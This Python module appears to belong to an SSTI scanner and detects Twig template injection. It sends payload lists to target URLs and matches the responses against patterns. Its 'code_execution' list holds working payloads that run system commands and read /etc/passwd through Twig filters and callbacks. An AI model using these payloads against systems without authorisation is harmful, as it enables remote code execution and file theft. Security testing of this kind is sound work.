"""
Twig template engine detection module.

This module implements Server-Side Template Injection (SSTI) detection
for the Twig template engine, commonly used in Symfony framework.

Author: SSTI Scanner Team
License: MIT
"""

import re
import urllib.parse
from typing import List, Dict, Any, Optional

from .base import BaseTemplateEngine, EngineResult, ConfidenceLevel, Payload


class TwigEngine(BaseTemplateEngine):
    """
    Twig template engine detector.
    
    Twig is the default template engine for Symfony framework.
    It uses {{ }} for expressions and {% %} for statements.
    """
    
    def __init__(self, config):
        super().__init__(config)
        self.name = "twig"
        self.description = "Twig template engine (Symfony)"
        self.payloads = self._load_payloads()
        
        # Twig-specific patterns for detection
        self.detection_patterns = {
            'math_result': [
                r'\b49\b',  # 7*7
                r'\b64\b',  # 8*8
                r'\b121\b', # 11*11
            ],
            'object_disclosure': [
                r'object\(.*?Symfony',
                r'object\(.*?Twig',
                r'Twig\\Environment',
                r'Symfony\\Bundle',
                r'Symfony\\Component',
            ],
            'variable_disclosure': [
                r'array\(\d+\)\s*{',
                r'\[object Object\]',
                r'Twig_Environment',
                r'globals.*?array',
            ],
            'filter_execution': [
                r'TESTSTRING',
                r'teststring',
                r'GNIRTSTSET',  # reverse of TESTSTRING
            ],
            'function_execution': [
                r'current_user',
                r'is_granted',
                r'path\(',
                r'url\(',
            ]
        }
    
    def _load_payloads(self) -> List[Payload]:
        """Load Twig-specific SSTI payloads."""
        payloads = []
        
        # Basic math operations
        math_payloads = [
            "{{7*7}}",
            "{{8*8}}",
            "{{11*11}}",
            "{{ 7 * 7 }}",
            "{{7*'7'}}",
            "{{(7)*7}}",
            "{{7*(7)}}",
            "{{(7)*(7)}}",
        ]
        
        for payload in math_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="html",
                description="Basic mathematical operation"
            ))
        
        # Object/variable access
        object_payloads = [
            "{{app}}",
            "{{_self}}",
            "{{app.request}}",
            "{{app.session}}",
            "{{app.security}}",
            "{{app.user}}",
            "{{dump(app)}}",
            "{{dump(_self)}}",
            "{{app.request.headers}}",
            "{{app.request.server}}",
            "{{global}}",
            "{{_context}}",
            "{{app.debug}}",
            "{{app.environment}}",
        ]
        
        for payload in object_payloads:
            payloads.append(Payload(
                payload=payload,
                type="object_access",
                context="html",
                description="Object/variable access"
            ))
        
        # Filter exploitation
        filter_payloads = [
            "{{\"TESTSTRING\"|upper}}",
            "{{\"TESTSTRING\"|lower}}",
            "{{\"TESTSTRING\"|reverse}}",
            "{{\"test\"|capitalize}}",
            "{{7|number_format}}",
            "{{\"<script>\"|raw}}",
            "{{\"\"|join}}",
            "{{[1,2,3]|join(',')}}",
            "{{\"test\"|length}}",
            "{{\"test\"|first}}",
            "{{\"test\"|last}}",
        ]
        
        for payload in filter_payloads:
            payloads.append(Payload(
                payload=payload,
                type="filter",
                context="html",
                description="Filter exploitation"
            ))
        
        # Function calls
        function_payloads = [
            "{{max(1,2)}}",
            "{{min(1,2)}}",
            "{{range(1,3)}}",
            "{{random(100)}}",
            "{{date()}}",
            "{{dump()}}",
            "{{cycle(['a','b'], 1)}}",
            "{{attribute(app, 'debug')}}",
            "{{constant('PHP_VERSION')}}",
        ]
        
        for payload in function_payloads:
            payloads.append(Payload(
                payload=payload,
                type="function",
                context="html",
                description="Function execution"
            ))
        
        # Code execution attempts
        code_payloads = [
            "{{app.request.server.get('SERVER_SOFTWARE')}}",
            "{{_self.env.getFunction('system')}}",
            "{{_self.env.registerUndefinedFilterCallback('system')}}",
            "{{['cat /etc/passwd']|filter('system')}}",
            "{{_self.env.getFilter('system')}}",
            "{{app.request.query.get('cmd')|passthru}}",
            "{{'/etc/passwd'|file_get_contents}}",
            "{{phpinfo()}}",
            "{{system('id')}}",
            "{{exec('whoami')}}",
        ]
        
        for payload in code_payloads:
            payloads.append(Payload(
                payload=payload,
                type="code_execution",
                context="html",
                description="Code execution attempt"
            ))
        
        # Context-specific payloads
        # URL context
        url_payloads = [
            "%7B%7B7*7%7D%7D",  # {{7*7}} URL encoded
            "%7B%7Bapp%7D%7D",  # {{app}} URL encoded
            "%7B%7B_self%7D%7D", # {{_self}} URL encoded
        ]
        
        for payload in url_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="url",
                description="URL-encoded payload"
            ))
        
        # Attribute context
        attr_payloads = [
            "x{{7*7}}",
            "x{{app}}",
            "{{7*7}}x",
            "{{app}}x",
        ]
        
        for payload in attr_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="attribute",
                description="Attribute context payload"
            ))
        
        # Advanced exploitation
        advanced_payloads = [
            # Method calling
            "{{app.request.getMethod()}}",
            "{{app.request.getUri()}}",
            "{{app.request.getHost()}}",
            "{{app.request.getScheme()}}",
            
            # Symfony-specific
            "{{app.security.isGranted('ROLE_USER')}}",
            "{{is_granted('ROLE_ADMIN')}}",
            "{{app.user.username}}",
            "{{app.session.id}}",
            
            # Template inheritance
            "{{parent()}}",
            "{{block('content')}}",
            
            # Macro calls
            "{{_self.macro_name()}}",
            
            # Error triggering
            "{{undefined_variable}}",
            "{{app.undefined_method()}}",
            "{{7/0}}",
        ]
        
        for payload in advanced_payloads:
            payloads.append(Payload(
                payload=payload,
                type="advanced",
                context="html",
                description="Advanced Twig exploitation"
            ))
        
        return payloads
    
    async def test_payload(self, url: str, payload: str, **kwargs) -> EngineResult:
        """
        Test a single payload against the target URL.
        
        Args:
            url: Target URL
            payload: Payload to test
            **kwargs: Additional arguments (http_client, method, data, headers)
        
        Returns:
            EngineResult with test results
        """
        http_client = kwargs.get('http_client')
        method = kwargs.get('method', 'GET')
        data = kwargs.get('data', {})
        headers = kwargs.get('headers', {})
        
        if not http_client:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response="",
                evidence="No HTTP client provided",
                engine=self.name
            )
        
        try:
            # Determine injection point and method
            if method.upper() == 'GET':
                # URL parameter injection
                if '?' in url:
                    test_url = url.replace('INJECT', payload)
                    if 'INJECT' not in url:
                        # Add payload to first parameter
                        if '=' in url:
                            test_url = re.sub(r'(=)([^&]*)', f'\\1{payload}', url, count=1)
                        else:
                            test_url = f"{url}&test={payload}"
                    else:
                        test_url = url.replace('INJECT', payload)
                else:
                    test_url = f"{url}?test={payload}"
                
                response = await http_client.get(test_url, headers=headers)
            else:
                # POST data injection
                if data:
                    # Inject into existing data
                    test_data = data.copy()
                    if 'INJECT' in str(test_data):
                        test_data = {k: v.replace('INJECT', payload) if isinstance(v, str) else v 
                                   for k, v in test_data.items()}
                    else:
                        # Add payload to first field or create test field
                        if test_data:
                            first_key = next(iter(test_data))
                            test_data[first_key] = payload
                        else:
                            test_data['test'] = payload
                else:
                    test_data = {'test': payload}
                
                response = await http_client.post(url, data=test_data, headers=headers)
            
            # Analyze the response
            return self.analyze_response("", payload, response.get('text', ''))
            
        except Exception as e:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response="",
                evidence=f"Request failed: {str(e)}",
                engine=self.name
            )
    
    def analyze_response(self, original_response: str, payload: str, response: str) -> EngineResult:
        """
        Analyze response for Twig SSTI indicators.
        
        Args:
            original_response: Original response (baseline)
            payload: Payload that was sent
            response: Response to analyze
        
        Returns:
            EngineResult with analysis results
        """
        if not response:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response=response,
                evidence="Empty response",
                engine=self.name
            )
        
        # Check for direct payload reflection (likely not vulnerable)
        if payload in response and not any(pattern in response.lower() for pattern in ['twig', 'symfony']):
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response=response,
                evidence="Payload reflected without execution",
                engine=self.name
            )
        
        evidence_parts = []
        confidence = ConfidenceLevel.LOW
        is_vulnerable = False
        
        # Math operation detection
        if any(p in payload for p in ['7*7', '8*8', '11*11']):
            for pattern in self.detection_patterns['math_result']:
                if re.search(pattern, response):
                    evidence_parts.append(f"Mathematical operation executed: found {pattern}")
                    confidence = ConfidenceLevel.HIGH
                    is_vulnerable = True
                    break
        
        # Object disclosure detection
        for pattern in self.detection_patterns['object_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Object disclosure detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Variable disclosure detection
        for pattern in self.detection_patterns['variable_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Variable disclosure detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Filter execution detection
        if any(f in payload.lower() for f in ['upper', 'lower', 'reverse', 'capitalize']):
            for pattern in self.detection_patterns['filter_execution']:
                if pattern in response:
                    evidence_parts.append(f"Filter execution detected: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Function execution detection
        for pattern in self.detection_patterns['function_execution']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Function execution detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Twig-specific error messages
        twig_errors = [
            'Twig_Error',
            'Twig\\Error',
            'Unknown function',
            'Unknown filter',
            'Variable does not exist',
            'Unexpected token',
            'Unable to call',
        ]
        
        for error in twig_errors:
            if error in response:
                evidence_parts.append(f"Twig error detected: {error}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Symfony-specific indicators
        symfony_indicators = [
            'Symfony\\Component',
            'Symfony\\Bundle',
            'AppBundle',
            'ContainerInterface',
            'ParameterBag',
        ]
        
        for indicator in symfony_indicators:
            if indicator in response:
                evidence_parts.append(f"Symfony framework detected: {indicator}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Check for successful dump() output
        if 'dump(' in payload.lower():
            dump_patterns = [
                r'array:\d+\s*\[',
                r'object\([^)]+\)',
                r'string\(\d+\)',
                r'boolean\s+(true|false)',
                r'integer\s+\d+',
            ]
            
            for pattern in dump_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"Dump output detected: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for app object disclosure
        if 'app' in payload.lower():
            app_patterns = [
                r'Symfony\\Bridge',
                r'Request.*?object',
                r'Session.*?object',
                r'Security.*?object',
                r'User.*?object',
            ]
            
            for pattern in app_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"App object disclosure: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for template self-reference
        if '_self' in payload:
            self_patterns = [
                r'Twig.*?Template',
                r'Template.*?object',
                r'getTemplateName',
                r'getSourceContext',
            ]
            
            for pattern in self_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"Template self-reference detected: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Compile evidence
        if evidence_parts:
            evidence = "Twig SSTI detected: " + "; ".join(evidence_parts)
        else:
            evidence = "No Twig SSTI indicators found"
            
        return EngineResult(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            payload=payload,
            response=response[:500],  # Limit response size
            evidence=evidence,
            engine=self.name
        )
    
    def get_payloads_for_context(self, context: str) -> List[Payload]:
        """Get payloads suitable for a specific context."""
        return [p for p in self.payloads if p.context == context]
    
    def get_payloads_by_type(self, payload_type: str) -> List[Payload]:
        """Get payloads of a specific type."""
        return [p for p in self.payloads if p.type == payload_type]
    
    def encode_payload(self, payload: str, context: str) -> str:
        """
        Encode payload for specific context.
        
        Args:
            payload: Original payload
            context: Target context (url, html, attribute, etc.)
        
        Returns:
            Encoded payload
        """
        if context == "url":
            return urllib.parse.quote(payload)
        elif context == "html":
            return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        elif context == "attribute":
            return payload.replace('"', '&quot;').replace("'", '&#x27;')
        elif context == "javascript":
            return payload.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
        else:
            return payload
    
    def get_info(self) -> Dict[str, Any]:
        """Get engine information."""
        return {
            'name': self.name,
            'description': self.description,
            'payloads': len(self.payloads),
            'contexts': list(set(p.context for p in self.payloads)),
            'types': list(set(p.type for p in self.payloads)),
            'framework': 'Symfony',
            'language': 'PHP',
            'syntax': '{{ expression }} and {% statement %}'
        }
    
    def get_context_payloads(self, context: str) -> list:
        """Get Twig payloads for specific context."""
        # TODO: Implement context-aware Twig payloads
        return []
